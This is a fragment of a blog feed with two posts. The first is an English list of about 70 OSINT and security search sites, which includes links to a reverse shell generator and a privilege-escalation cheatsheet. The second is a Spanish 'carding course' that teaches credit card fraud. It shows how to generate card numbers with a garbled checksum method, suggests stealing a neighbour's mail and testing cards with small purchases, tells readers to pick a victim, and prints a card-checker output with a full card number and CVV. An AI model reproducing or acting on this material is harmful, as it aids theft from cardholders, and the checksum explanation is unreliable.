+</div>]]></content><author><name></name></author><category term="CyberSecurity" /><category term="Hacker" /><category term="OSINT" /><summary type="html"><![CDATA[¿Qué es el acaparamiento de IP? (y cómo proteger su IP)]]></summary></entry><entry><title type="html">My Hacking &amp;amp; Search Engines [Top 70]</title><link href="http://localhost:4000/blog/my-top-search-engines" rel="alternate" type="text/html" title="My Hacking &amp;amp; Search Engines [Top 70]" /><published>2022-11-17T00:00:00+01:00</published><updated>2022-11-17T00:00:00+01:00</updated><id>http://localhost:4000/blog/my-top-search-engines</id><content type="html" xml:base="http://localhost:4000/blog/my-top-search-engines"><![CDATA[<ul>
+  <li>Shodan</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for devices connected to the internet</code>
+<a href="https://www.shodan.io/">Shodan</a></p>
+
+<ul>
+  <li>Wigle</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Database of wireless networks, with statistics</code>
+<a href="https://www.wigle.net/">Wigle</a></p>
+
+<ul>
+  <li>GreyNoise</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for devices connected to the internet</code>
+<a href="https://www.greynoise.io/">GreyNoise</a></p>
+
+<ul>
+  <li>VirusTotal</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Analyse suspicious files, domains, IPs, and URLs to detect malware</code>
+<a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p>
+
+<ul>
+  <li>UrlScan</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Free service to scan and analyse websites</code>
+<a href="https://urlscan.io/">urlscan</a></p>
+
+<ul>
+  <li>Vulners</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for vulnerabilities in a large database</code>
+<a href="https://vulners.com/">Vulners</a></p>
+
+<ul>
+  <li>WayBackMachine</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">View content from deleted websites or take a deep dive into the history of the web</code>
+<a href="https://web.archive.org/">WayBackMachine</a></p>
+
+<ul>
+  <li>Netlas</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search and monitor internet connected assets</code>
+<a href="https://netlas.io/">Netlas</a></p>
+
+<ul>
+  <li>ONYPHE</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Collects cyber-threat intelligence data</code>
+<a href="https://www.onyphe.io/">ONYPHE</a></p>
+
+<ul>
+  <li>FullHunt</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search and discovery attack surfaces</code>
+<a href="https://fullhunt.io/">FullHunt</a></p>
+
+<ul>
+  <li>GrepApp</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search across a half million git repos</code>
+<a href="https://grep.app/">GreApp</a></p>
+
+<ul>
+  <li>Crt sh</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for certs that have been logged by CT</code>
+<a href="https://crt.sh/">Crt sh</a></p>
+
+<ul>
+  <li>PulseDrive</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for threat intelligence</code>
+<a href="https://pulsedive.com/">PulseDrive</a></p>
+
+<ul>
+  <li>CVE</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">The CVE website was created to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities</code>
+<a href="https://cve.mitre.org/">CVE</a></p>
+
+<ul>
+  <li>ExploitDB</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Archive of Various Exploits</code>
+<a href="https://www.exploit-db.com/">ArchiveDB</a></p>
+
+<ul>
+  <li>DNSDumpster</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">DNS Recon &amp; Research, Find &amp; Lookup DNS Records</code>
+<a href="https://dnsdumpster.com/">DNSDumpster</a></p>
+
+<ul>
+  <li>InteligenceX</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search Tor, I2P, Data Leaks, Domains and Emails</code>
+<a href="https://intelx.io/">InteligenceX</a></p>
+
+<ul>
+  <li>LeakIX</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search publicly indexed information</code>
+<a href="https://leakix.net/">LeakIX</a></p>
+
+<ul>
+  <li>Hunter.io</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search for email addresses belonging to a website</code>
+<a href="https://hunter.io/">Hunter.io</a></p>
+
+<ul>
+  <li>OSINT Framework</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">OSINT (Open Source Intelligence) Framework website, some links don’t work anymore but it’s still a good website</code>
+<a href="https://osintframework.com/">OSINTFramework</a></p>
+
+<ul>
+  <li>TinEye</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Reverse Image Search</code>
+<a href="https://tineye.com/">TinEye</a></p>
+
+<ul>
+  <li>Binary Edge</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Scans the internet for threat intelliegence</code>
+<a href="https://www.binaryedge.io/">BinaryEdge</a></p>
+
+<ul>
+  <li>Alien Vault</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Open Threat Intelligence Community</code>
+<a href="https://otx.alienvault.com/">AlienVault</a></p>
+
+<ul>
+  <li>GreyHatWarfare</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search public S3 buckets</code>
+<a href="https://grayhatwarfare.com/">GreyHatWarfare</a></p>
+
+<ul>
+  <li>Censys</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">One can search through the Internet of Things using Shodan or Censys and find literally everything</code>
+<a href="https://search.censys.io/">Censys</a></p>
+
+<ul>
+  <li>Ahmia</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Ahmia searches hidden services on the Tor network</code>
+<a href="https://ahmia.fi/">Ahmia</a></p>
+
+<ul>
+  <li>Spokeo</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search by name, phone, address, or email to confidentially lookup information about people you know such as yourself, friends, family, acquaintances, and old classmates</code>
+<a href="https://www.spokeo.com/">Spokeo</a></p>
+
+<ul>
+  <li>CentralOps</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Investigate domains and IP addresses. Get registrant information, DNS records, and more—all in one report</code>
+<a href="https://centralops.net/co/">CentralOps</a></p>
+
+<ul>
+  <li>MX Lookup</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">This test will list MX records for a domain in priority order</code>
+<a href="https://mxtoolbox.com/">MXLookup</a></p>
+
+<ul>
+  <li>ViewDns.info</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Dns look up</code>
+<a href="https://viewdns.info/">ViewDns.info</a></p>
+
+<ul>
+  <li>Robtex</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Robtex is used for various kinds of research of IP numbers, Domain names, etc</code>
+<a href="https://www.robtex.com/">Robtex</a></p>
+
+<ul>
+  <li>CiberPatrulla</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Enlaces a Herramientas OSINT</code>
+<a href="https://ciberpatrulla.com/links/">CiberPatrulla</a></p>
+
+<ul>
+  <li>IP2Location</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Identify Geographical Location and Proxy by IP Address</code>
+<a href="https://www.ip2location.com/">Ip2Location</a></p>
+
+<ul>
+  <li>MAC Look Up</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">MAC Address and OUI Lookup</code>
+<a href="https://aruljohn.com/mac.pl">MACLookUp</a></p>
+
+<ul>
+  <li>IP Address Tools</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Free IP address tools allow you to ping an IP address, traceroute an IP address, convert IP address into decimal value or CIDR format, and so on for both IPv4 and IPv6 format</code>
+<a href="https://www.ipaddressguide.com/">IPAddressTools</a></p>
+
+<ul>
+  <li>Hurricane Electric</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Internet analysis site for the whole Internet</code>
+<a href="https://bgp.he.net/">Hurricane Electric</a></p>
+
+<ul>
+  <li>GPS Coordinates</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Special tool for conversion of GPS coordinates</code>
+<a href="https://www.coordenadas-gps.com/convertidor-de-coordenadas-gps">GPSCoordinates</a></p>
+
+<ul>
+  <li>WhitePages</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Find people, contact info &amp; background checks, works goos with USA</code>
+<a href="https://www.whitepages.com/">WhitePages</a></p>
+
+<ul>
+  <li>CheckHost</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Check-Host is a modern online tool for website monitoring and checking availability of hosts, DNS records, IP addresses</code>
+<a href="https://check-host.net/?lang=en">CheckHost</a></p>
+
+<ul>
+  <li>EPIEOS</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Retrieve information linked to an email address, with our Europe hosted engine</code>
+<a href="https://epieos.com/">EPIEOS</a></p>
+
+<ul>
+  <li>HTTrack</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">It allows you to download a World Wide Web site from the Internet to a local directory, building recursively all directories, getting HTML, images, and other files from the server to your computer</code>
+<a href="https://www.httrack.com/page/1/en/index.html">HTTrack</a></p>
+
+<ul>
+  <li>OSIRT Browser</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">OSIRT is your investigation, simplified; it provides a comprehensive, collaborative platform from artefact capture to report to court, all without the need to be an expert user</code>
+<a href="https://osirtbrowser.com/">OSIRT</a></p>
+
+<ul>
+  <li>Cover Your Tracks</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">See how trackers view your browser</code>
+<a href="https://coveryourtracks.eff.org/">CoverYourTracks</a></p>
+
+<ul>
+  <li>Programmable Search Engine (Google)</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Get started by providing some basic information about your engine. You'll be able to customize the engine's configs (Languages, regions, etc.) further after it is created</code>
+<a href="https://programmablesearchengine.google.com/controlpanel/create">ProgrammableSearchEngine</a></p>
+
+<ul>
+  <li>WikiMapia</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Comunity world wide web map</code>
+<a href="http://wikimapia.org/">WikiMapia</a></p>
+
+<ul>
+  <li>I Know Where Your Cat Lives</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">World cat map, usefull for geo int</code>
+<a href="https://iknowwhereyourcatlives.com/">CatMap</a></p>
+
+<ul>
+  <li>Blockchain Explorer</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Search across all transactions on blockchain, usefull to find anonymous transactions</code>
+<a href="https://www.blockchain.com/es/explorer">BlockChainExplore</a></p>
+
+<ul>
+  <li>Ehterscan.io</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">The Ethereum Blockchain Explorer, find anonymous transactions</code>
+<a href="https://etherscan.io/">EhterScan</a></p>
+
+<ul>
+  <li>PimEyes</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Face Search Engine Reverse Image Search, limited, not free at all</code>
+<a href="https://pimeyes.com/en">PimEyes</a></p>
+
+<ul>
+  <li>Tweet Mapper</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Twitter geo location tool</code>
+<a href="https://keitharm.me/projects/tweet/">TweetMapper</a></p>
+
+<ul>
+  <li>onemilliontweetmap</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">World map of twitts</code>
+<a href="https://onemilliontweetmap.com/">onemilliontweetmap</a></p>
+
+<ul>
+  <li>whotwi</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Graphical twitter analisys</code>
+<a href="https://es.whotwi.com/">whotwi</a></p>
+
+<ul>
+  <li>Twwiter ID</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Twitter ID and username converter</code>
+<a href="https://tweeterid.com/">TwitterID</a></p>
+
+<ul>
+  <li>Twiangulate</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">example: BillGates + Oprah, analizing relationship tool for twitter</code>
+<a href="https://twiangulate.com/search/">Twiangulate</a></p>
+
+<ul>
+  <li>Heavy AI</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">World wide TWEET MAP</code>
+<a href="https://www.heavy.ai/">HeavyAI</a></p>
+
+<ul>
+  <li>Nameck_k</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Check for usernames over social media</code>
+<a href="https://namechk.com/">Nameck_k</a></p>
+
+<ul>
+  <li>gigatweet/stream</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">View total Twitter tweets in real time</code>
+<a href="http://gigatweeter.com/">gigatweet</a></p>
+
+<ul>
+  <li>Foller.me</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Twitter analytics application that gives you rich insights about any public Twitter profile</code>
+<a href="https://foller.me/">Foller.me</a></p>
+
+<ul>
+  <li>Social Bearing</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Free Twitter analytics &amp; search for tweets, timelines &amp; twitter maps</code>
+<a href="https://socialbearing.com/">Social Bearing</a></p>
+
+<ul>
+  <li>TwitterAudit</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">How many of your followers are fake?</code>
+<a href="https://twitteraudit.com/">TwitterAudit</a></p>
+
+<ul>
+  <li>TweetDeck</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">TweetDeck is your personal browser for staying in touch with what's happening now</code>
+<a href="https://tweetdeck.twitter.com/">TweetDeck</a></p>
+
+<ul>
+  <li>Reverse Shell Generator</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Reverse Sheel Generator</code>
+<a href="https://www.revshells.com/">ReverseShell</a></p>
+
+<ul>
+  <li>CVE Details</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Data source vulnerabilty</code>
+<a href="https://www.cvedetails.com/">CVEDetails</a></p>
+
+<ul>
+  <li>VulnHub</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Provide materials that allows anyone to gain practical 'hands-on' experience in digital security, computer software &amp; network administration</code>
+<a href="https://www.vulnhub.com/">VulnHub</a></p>
+
+<ul>
+  <li>Hash/UNHASH</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Generate hash out of the string and lookup (unhash) for hash value in our pre-computed hash-tables, and more</code>
+<a href="https://md5hashing.net/">HashUNHASH</a></p>
+
+<ul>
+  <li>Cisco Talos</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Real Time World map, Query by IP, domain, or network owner for real-time threat data</code>
+<a href="https://talosintelligence.com/">CiscoTalos</a></p>
+
+<ul>
+  <li>Temp SMS</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">SMS Receive textsms Online Instantly</code>
+<a href="https://temp-sms.org/">TempSMS</a></p>
+
+<ul>
+  <li>Sub NET</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">MAC Address Lookup, MAC address or vendor</code>
+<a href="https://es.adminsub.net/mac-address-finder">SubNET</a></p>
+
+<ul>
+  <li>Caja de Herramientas de Google Admin</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Usa la caja de herramientas de Google Admin para solucionar los problemas que te encuentres en los servicios de Google Workspace</code>
+<a href="https://toolbox.googleapps.com/apps/main/">GoogleAdmin</a></p>
+
+<ul>
+  <li>Pentest Tools</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Start a full pentest in minutes with powerful cloud-based tools, plus flexible reporting, automation, and collaboration options</code>
+<a href="https://pentest-tools.com/">PentestTools</a></p>
+
+<ul>
+  <li>SPF Record Testing Tools</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Test an SPF record, Does my domain already have an SPF record? What is it? Is it valid?</code>
+<a href="https://www.kitterman.com/spf/validate.html">Kitterman</a></p>
+
+<ul>
+  <li>Hunter</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Hunter lets you find professional email addresses in seconds and connect with the people that matter for your business</code>
+<a href="https://hunter.io/">Hunter</a></p>
+
+<ul>
+  <li>Privilege Escalation cheatsheet</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Offensive privilege escalation cheatsheet</code>
+<a href="https://0xsp.com/offensive/privilege-escalation-cheatsheet/">PrivilegeEscalationCheatSheet</a></p>
+
+<blockquote>
+  <blockquote>
+    <p>Grab this to your markers, y will update it often</p>
+  </blockquote>
+</blockquote>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <blockquote>
+        <blockquote>
+          <blockquote>
+            <blockquote>
+              <p>cheers!</p>
+            </blockquote>
+          </blockquote>
+        </blockquote>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/my-top-search-engines');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/my-top-search-engines');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/my-top-search-engines&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/my-top-search-engines');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/my-top-search-engines');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="CyberSecurity" /><category term="Hacker" /><category term="OSINT" /><summary type="html"><![CDATA[My Top 70 CyberSec Search Engines & Hacking]]></summary></entry><entry><title type="html">Curso de Carding</title><link href="http://localhost:4000/blog/curso-carding" rel="alternate" type="text/html" title="Curso de Carding" /><published>2022-11-16T00:00:00+01:00</published><updated>2022-11-16T00:00:00+01:00</updated><id>http://localhost:4000/blog/curso-carding</id><content type="html" xml:base="http://localhost:4000/blog/curso-carding"><![CDATA[<h2 id="disclamer">Disclamer:</h2>
+<p><code class="language-plaintext highlighter-rouge">NO asumo ninguna responsabilidad debida al mal empleo de la información aquí contenida, puesto que este texto solamente tiene fines educativos y en ningún caso pretende incitar a nadie a cometer ningún delito ya sea informático o de otra índole</code></p>
+
+<h4 id="introducción">Introducción</h4>
+
+<p><code class="language-plaintext highlighter-rouge">En este curso voy a indicar que es el carding? Algunos términos del mismo como utilizarlo y sacar provecho 🙂</code></p>
+
+<h3 id="comencemos">Comencemos…!</h3>
+
+<h2 id="carding">Carding</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Este es un concepto que indica lo más claramente posible que es y de que se trata el carding.
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Carding: Es el uso ilegitimo de las tarjetas de crédito, o de sus números, pertenecientes a otras personas. Se relaciona con el hacking, porque para conseguir números de tarjetas de créditos, una de las formas es utilizando Ingenieria Social y sobre todo nuestra inteligencia (esto es lo mas importante)</code></p>
+
+<hr />
+<ul>
+  <li>Se debe tener mucho cuidado en hacer esto ya que nos podemos meter en muchos líos.</li>
+  <li>Con nuestras tarjetas de crédito debemos ser cuidadosos ya que alguien puede leer este documento antes que uno de ustedes y ser capaz de estafarlos.</li>
+  <li>
+    <h2 id="se-puede-recuperar-el-dinero-talvez-pero-para-eso-tendrían-que-hablar-con-el-administrador-del-sitio-donde-se-realizo-el-pago-del-artículo-solicitando-la-ip-de-donde-se-hizo-la-compra-y-luego-de-todo-esto-tenemos-que-demostrar-que-nosotros-no-hicimos-la-compra-del-mismo">Se puede recuperar el dinero talvez pero para eso tendrían que hablar con el administrador del sitio donde se realizo el pago del artículo solicitando la IP de donde se hizo la compra y luego de todo esto tenemos que demostrar que nosotros no hicimos la compra del mismo.</h2>
+  </li>
+</ul>
+
+<hr />
+<ul>
+  <li>
+    <p>Los números de las tarjetas se forman de 16 dígitos divididos en 4 grupos de 4 dígitos pueden tener valores del 0 al 9 los primeros 4 dígitos sirven para determinar el banco.</p>
+  </li>
+  <li>
+    <p>El resto de números se pone al azar no mentira vamos a ver el algoritmo.</p>
+  </li>
+  <li>
+    <p>Hagamos un ejemplo de la creación de un número de tarjeta.</p>
+  </li>
+</ul>
+
+<h4 id="numero-de-tarjeta-5180-2345-3942-8765">Numero de tarjeta: 5180 2345 3942 8765</h4>
+
+<h5 id="las-posiciones-impares-son">Las posiciones impares son:</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5
+8
+2
+4
+3
+4
+8
+6
+</code></pre></div></div>
+<h5 id="luego-de-esto-se-multiplica-los-2-primeros-dígitos-entre-si-luego-los-siguientes-y-asi-sucesivamente-para-que-sea-mas-claro-quedaría-de-la-siguiente-forma">Luego de esto se multiplica los 2 primeros dígitos entre si luego los siguientes y asi sucesivamente para que sea mas claro quedaría de la siguiente forma:</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5*8=40
+2*4=8
+3*4=12
+8*6=48
+</code></pre></div></div>
+<h5 id="si-tenemos-cifras-mayores-a-9-se-suma-los-números-es-decir-las-cifras-reducidas-8513-entonces">Si tenemos cifras mayores a 9 se suma los números es decir las cifras reducidas 8+5=13 entonces</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1+3=4
+</code></pre></div></div>
+<h5 id="en-el-ejemplo-quedaría-asi">En el ejemplo quedaría asi:</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5*8=40 4+0=4
+2*4=8 8
+3*4=12 1+2=3
+8*6=48 4+8=12 1+2=3
+</code></pre></div></div>
+<h5 id="en-resumen-los-números-que-nos-quedan-son">En resumen los números que nos quedan son:</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4
+8
+3
+3
+</code></pre></div></div>
+<h5 id="luego-de-esto-suma-los-números-pares-que-descartamos-al-principio-y-súmalos-con-estos-el-resultado-debe-ser-un-número-múltiplo-de-10-para-que-el-número-sea-correcto">Luego de esto suma los números pares que descartamos al principio y súmalos con estos el resultado debe ser un número múltiplo de 10 para que el número sea correcto:</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4+8+3+3+1+0+3+5+9+2+7+5=50
+</code></pre></div></div>
+<h5 id="si-no-nos-diera-un-numero-correcto-como-va-a-suceder-en-la-mayoría-de-los-casos-lo-recomendable-es-dejar-el-ultimo-casillero-libre-y-jugar-con-este-digito-hasta-que-nos-de-un-numero-valido">Si no nos diera un numero correcto como va a suceder en la mayoría de los casos lo recomendable es dejar el ultimo casillero libre y jugar con este digito hasta que nos de un numero valido.</h5>
+
+<h5 id="esta-es-una-de-las-formas-de-conseguir-un-numero-de-tarjeta-de-crédito-es-decir-adivinando-a-ver-si-nos-sale-otra-puede-ser-esperar-pacientemente-el-fin-de-mes-el-momento-que-llega-el-corte-de-pago-de-la-tarjeta-del-vecino-nos-robamos-su-correspondencia-y-listo-ahí-tenemos-un-numerito">Esta es una de las formas de conseguir un numero de tarjeta de crédito es decir adivinando a ver si nos sale otra puede ser esperar pacientemente el fin de mes el momento que llega el corte de pago de la tarjeta del vecino nos robamos su correspondencia y listo ahí tenemos un numerito.</h5>
+
+<h4 id="si-el-primer-numero-es">Si el primer numero es….</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3 -&gt;American Express (15 dígitos)
+4 -&gt;VISA (13 o 16 dígitos)
+5 -&gt;Mastercard (16 dígitos)
+6 -&gt;Discover (16 dígitos)
+</code></pre></div></div>
+
+<h4 id="con-estos-datos-ya-se-puede-comprar-algo-en-línea-generalmente-los-carders-realizan-una-compra-de-algún-software-pequeño-que-sea-de-descarga-o-una-subscripción-para-ver-pornografía-esto-lo-hacen-para-probar-si-la-tarjeta-funciona-o-no-">Con estos datos ya se puede comprar algo en línea generalmente los carders realizan una compra de algún software pequeño que sea de descarga o una subscripción para ver pornografía esto lo hacen para probar si la tarjeta funciona o no .</h4>
+
+<h4 id="si-el-momento-de-la-compra-nos-solicitaran-mas-datos-ya-saben-que-hacer-es-mas-creo-que-al-momento-de-revisar-su-correo-no-tendrán-estos-datos-tendrán-muchos-mas">Si el momento de la compra nos solicitaran mas datos ya saben que hacer es mas creo que al momento de revisar su correo no tendrán estos datos tendrán muchos mas.</h4>
+
+<h4 id="hagan-un-repaso-de-lo-que-aprendieron-hasta-aquí-y-piensen-en-una-posible-victima-hasta-mientras-me-voy-hacer-un-cafey-a-estudiar">Hagan un repaso de lo que aprendieron hasta aquí y piensen en una posible victima hasta mientras me voy hacer un cafe…….y a estudiar.!</h4>
+
+<h5 id="aqui-te-dejo-un-ejemplo-de-como-un-carder-hace-uso-de-una-tarjeta-datos-ficticios-y-no-reales">Aqui te dejo un ejemplo de como un carder hace uso de una tarjeta (datos ficticios y no reales):</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Card Information]━━
+• Card: 4892720002175670|10|2026|391
+• Status: Approved! ✅
+• Response: Decline CVV2/CID Fail
+• Gateway: Hades
+━━━━━━━━━━━━
+Bin Information
+• Bin: 489272
+• Bank: BENCHMARK COMMUNITY BANK
+• Country: UNITED STATES – 🇺🇸
+• BinType: DEBIT-VISA-CLASSIC
